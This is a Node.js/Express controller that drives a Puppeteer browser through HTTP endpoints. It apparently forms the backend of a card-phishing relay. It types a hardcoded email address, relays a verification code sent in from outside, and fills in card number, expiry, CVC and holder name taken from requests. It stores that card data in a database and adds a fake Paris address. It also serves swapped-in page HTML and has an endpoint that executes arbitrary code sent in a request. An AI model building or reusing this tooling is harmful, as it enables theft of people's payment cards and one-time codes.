const { Users: UserModel } = require('../models');
const puppeteer = require('puppeteer');
const path = require('path');
require("dotenv").config();
// const chrome = require('chrome-aws-lambda');
// const puppeteer = require('puppeteer-core');

let browser; // Global browser instance
let page; // Global page instance
let modifyedHTML = {};

module.exports = {
    LUNCH: async (req, res) => {
        try {
            // { headless: false }
            // console.log('Launching browser...');
            // const executablePath = await chrome.executablePath;

            // // if (!executablePath) {
            // //     throw new Error('Could not find Chromium executable path. Ensure chrome-aws-lambda is installed and configured correctly.');
            // // }
            // const executablePath = await chrome.executablePath;
            // browser = await puppeteer.launch({
            //     args: [...chrome.args, '--no-sandbox', '--disable-setuid-sandbox'],
            //     executablePath,
            //     headless: chrome.headless,
            //     defaultViewport: chrome.defaultViewport,
            // });
            // console.log('Browser launched successfully.');
            // return res.send({ success: true, message: 'OK' });
            browser = await puppeteer.launch({
                headless: 'new', // Opt-in to the new headless mode
                args: ['--no-sandbox', '--disable-setuid-sandbox'],
                executablePath: process.env.NODE_ENV === 'production' ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath(),
                protocolTimeout: 60000,
            });
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            if (browser) {
               await browser.close();
            }
            return res.status(500).send({ success: false, message: error.message });
        }
    },
    CLOSE: async (req, res) => {
        try {
            await page.close();
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            return res.status(500).send({ success: false, message: error.message });
        }
    },
    GOPAGE: async (req, res) => {
        try {
            const { url } = req.body;
            console.log(url,'url');
            console.log(123123123123123)
            console.log(123123123123123)
            console.log(123123123123123)
            console.log(123123123123123)
            page = await browser.newPage();
            modifyedHTML = {}
            console.log(page,'page')
            console.log(123123123123123)
            console.log(123123123123123)
            console.log(123123123123123)
            console.log(123123123123123)
            // { waitUntil: 'networkidle0', timeout: 60000 }
            await page.goto(url);
            await page.setViewport({width: 566, height: 691});
            // await page.waitForTimeout(5000);
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            return res.status(500).send({ success: false, message: error.message });
        }
    },
    PROCCED: async (req, res) => {
        try {
            await page.focus('body');
            await page.keyboard.press('Tab');
            await page.keyboard.press('Tab');
            await page.keyboard.type('ArietHyudi@proton.me');
            await page.keyboard.press('Tab');
            await page.keyboard.press('Enter');
            await page.waitForTimeout(5000);
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            return res.status(500).send({ success: false, message: error.message });
        }
    },
    EMAILVERIFICATION: async(req, res) => {
        try {
            let { code } = req?.body;
            const codeArray = code.split('');
            const inputSelectors = '.verification-code-input__item input[type="number"]';
            await page.waitForSelector(inputSelectors);
            const inputFields = await page.$$(inputSelectors);
            if (codeArray.length !== inputFields.length) {
                throw new Error(
                    'Code length does not match the number of input fields'
                );
            }
            for (let i = 0; i < codeArray.length; i++) {
                await inputFields[i].focus();
                await inputFields[i].type(codeArray[i], { delay: 100 });
            }
            await page.waitForTimeout(10000);
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            return res.status(500).send({ success: false, message: error.message });
        }
    },
    START: async (req, res) => {
        try {
            await page.waitForSelector('.card-select__item-header .card-select__toggle');
            await page.evaluate(() => {
                const cardItems = document.querySelectorAll('.card-select__item');
                cardItems.forEach(item => {
                    const placeholder = item.querySelector('.card-select__item-placeholder');
                    if (placeholder && placeholder.textContent.trim() === 'New card') {
                        const button = item.querySelector('.card-select__toggle');
                        if (button) {
                            button.click();
                        }
                    }
                });
            });
            await page.waitForTimeout(5000);
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            return res.status(500).send({ success: false, message: error.message });
        }
    },
    SENDCARDDATA: async (req, res) => {
        try {
            let { num, exp, cvc, holder } = req?.body;
            if (req?.body?.card) {
                const newUser = new UserModel({
                    ...req.body,
                });
                newUser.save();
            }
            await page.keyboard.type(holder);
            // await page.focus('body');
            await page.keyboard.press('Tab');
            await page.keyboard.type(num);
            await page.keyboard.press('Tab');
            await page.keyboard.type(exp);
            await page.keyboard.press('Tab');
            await page.keyboard.type(cvc);
            await page.keyboard.press('Tab');
            await page.keyboard.type('France');
            await page.waitForTimeout(2000);
            await page.keyboard.press('ArrowDown');
            await page.keyboard.press('Enter');
            await page.keyboard.press('Tab');
            await page.keyboard.type('Qajaznuni 4');
            await page.keyboard.press('Tab');
            await page.keyboard.type('Paris');
            await page.keyboard.press('Tab');
            await page.keyboard.type('0034');
            await page.keyboard.press('Tab');
            await page.keyboard.press('Tab');
            await page.keyboard.press('Enter');
            await page.waitForTimeout(10000);
            return res.send({ success: true, message: 'OK' });
        } catch (e) {
            return res.status(500).send({ success: false, message: 'ERROR ! ! !' });
        }
    },
    SETHTML:async(req,res)=>{
        try{
           const { step, HTML} = req.body;
           modifyedHTML = { [step] : HTML }
           return res.send({ success: true, message: modifyedHTML });
        }catch(error){
            return res.send({ success: false, message: error.message });
        }
    },
    GETHTML:async(req,res)=>{
        try{
           return res.send({ success: true, message: modifyedHTML });
        }catch(error){
            return res.send({ success: false, message: error.message });
        }
    },
    TAB: async (req, res) => {
        try {
            const body = req.body;
            await page.focus('body');
            if (body?.count > 1) {
                for (let i = 1; i > body.count || 1; i++) {
                    await page.keyboard.press('Tab');
                }
            } else {
                await page.keyboard.press('Tab');
            }
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            return res.send({ success: false, message: error.message });
        }
    },
    ENTER: async (req, res) => {
        try {
            await page.keyboard.press('Enter');
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            return res.send({ success: false, message: error.message });
        }
    },
    SCREENSHOT: async (req, res) => {
        try {
            const screenshotPath = path.resolve(
                __dirname,
                '../../public/screenshot.png'
            );
            await page.screenshot({ path: screenshotPath });
            return res.send({
                success: true,
                message: 'public/screenshot.png',
            });
        } catch (error) {
            return res.send({ success: false, message: error.message });
        }
    },
    BUTTON: async (req, res) => {
        try {
            const body = req.body;
            console.log(body?.buttonText, 'body?.buttonText');
            if (body?.buttonText) {
                await page.evaluate(() => {
                    const buttons = Array.from(
                        document.querySelectorAll('button')
                    );
                    const continueButton = buttons.find(
                        (button) =>
                            button.textContent.trim() === body?.buttonText
                    );
                    if (continueButton) {
                        continueButton.click();
                    }
                });
                return res.send({ success: true, message: 'OK' });
            } else {
                return res.send({
                    success: true,
                    message: 'Text is Required!',
                });
            }
        } catch (error) {
            return res.send({ success: false, message: error.message });
        }
    },
    GETHTMLCONTENT: async (req, res) => {
        try {
            const bodyContent = await page.evaluate(() => {
                return document.body.innerHTML;
            });
            return res.send({ success: true, message: bodyContent });
        } catch (e) {
            return res.send({
                success: true,
                message: 'ERROR Get CONTENT ! ! !',
            });
        }
    },
    WRITE: async (req, res) => {
        try {
            let { info } = req?.body;
            await page.type(info);
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            return res
                .status(500)
                .send({ success: false, message: error.message });
        }
    },
    ADDFUNC:async(req,res)=>{
        try{
            const k = req.body.data
            console.log(k,'k');
            for (const script of k) {
                const func = new Function('page', 'console', 'return (async () => {' + script + '})()');
                await func(page, console);
            }
            return res.send({ success: true, message: 'OK' });
        }catch (error) {
            return res
                .status(500)
                .send({ success: false, message: error.message });
        }
    }
};
